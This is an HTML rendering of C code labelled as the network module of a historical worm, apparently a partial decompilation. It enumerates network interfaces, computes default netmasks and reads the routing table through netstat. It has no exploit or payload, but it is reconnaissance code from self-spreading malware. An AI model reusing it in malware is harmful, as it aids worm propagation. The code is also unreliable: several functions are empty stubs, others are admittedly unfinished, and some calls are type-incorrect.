<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Dover.Worm.Code - NET.C.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* dover */</span><span class="sc0">

</span><span class="sc9">#include "worm.h"
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;net/if.h&gt;
</span><span class="sc0">
</span><span class="sc1">/* This is the second of five source files linked together to form the '.o'
 * file distributed with the worm.
 */</span><span class="sc0">

</span><span class="sc11">if_init</span><span class="sc10">()</span><span class="sc0">           </span><span class="sc1">/* 0x254c, check again */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ifconf</span><span class="sc0"> </span><span class="sc11">if_conf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ifreq</span><span class="sc0"> </span><span class="sc11">if_buffer</span><span class="sc10">[</span><span class="sc4">12</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">num_ifs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">local</span><span class="sc10">[</span><span class="sc4">48</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">nifs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* if_init+1042 */</span><span class="sc0">
    </span><span class="sc11">if_conf</span><span class="sc10">.</span><span class="sc11">ifc_req</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">if_buffer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">if_conf</span><span class="sc10">.</span><span class="sc11">ifc_len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">if_buffer</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ioctl</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SIOCGIFCONF</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">if_conf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* if_init+1042 */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">num_ifs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">if_conf</span><span class="sc10">.</span><span class="sc11">ifc_len</span><span class="sc10">/</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">if_buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">num_ifs</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">      </span><span class="sc1">/* if_init+144 */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nifs</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc1">/* Oops, look again.  This line needs verified. */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">ifs</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">if_buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ifr_name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">   

</span><span class="sc1">/* Yes all of these are in the include file, but why bother?  Everyone knows
   netmasks, and they will never change... */</span><span class="sc0">
</span><span class="sc11">def_netmask</span><span class="sc10">(</span><span class="sc11">net_addr</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc1">/* 0x2962 */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">net_addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">net_addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x80000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0xFF000000</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">net_addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xC0000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xC0000000</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0xFFFF0000</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0xFFFFFF00</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">netmaskfor</span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">)</span><span class="sc0">                </span><span class="sc1">/* 0x29aa */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mask</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">mask</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">def_netmask</span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nifs</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">mask</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ifs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">if_l16</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">mask</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ifs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">if_l24</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">mask</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">rt_init</span><span class="sc10">()</span><span class="sc0">                   </span><span class="sc1">/* 0x2a26 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pipe</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">input_buf</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">l204</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l304</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">ngateways</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">pipe</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">popen</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/usr/ucb/netstat -r -n"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
                         </span><span class="sc1">/* &amp;env102,&amp;env 125 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pipe</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">input_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">input_buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">pipe</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* to 518 */</span><span class="sc0">
    </span><span class="sc11">other_sleep</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ngateways</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">500</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">input_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%s%s"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">l204</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l304</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* &lt;env+127&gt;"%s%s" */</span><span class="sc0">
    </span><span class="sc1">/* other stuff, I'll come back to this later */</span><span class="sc0">
    
    
    </span><span class="sc10">}</span><span class="sc0">                       </span><span class="sc1">/* 518, back to 76 */</span><span class="sc0">
    </span><span class="sc11">pclose</span><span class="sc10">(</span><span class="sc11">pipe</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">rt_init_plus_544</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">                       </span><span class="sc1">/* 540 */</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">rt_init_plus_544</span><span class="sc10">()</span><span class="sc0">               </span><span class="sc1">/* 0x2c44 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">getaddrs</span><span class="sc10">()</span><span class="sc0">                  </span><span class="sc1">/* 0x2e1a */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">bar</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">a2in</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc1">/* 0x2f4a, needs to be fixed */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">bar</span><span class="sc0"> </span><span class="sc11">local</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">local</span><span class="sc10">.</span><span class="sc11">baz</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">local</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* End of source file in original. */</span><span class="sc0">

</span><span class="sc1">/*
 * Local variables:
 * compile-command: "cc -S net.c"
 * comment-column: 48
 * End:
 */</span><span class="sc0">
</span></div></body>
</html>
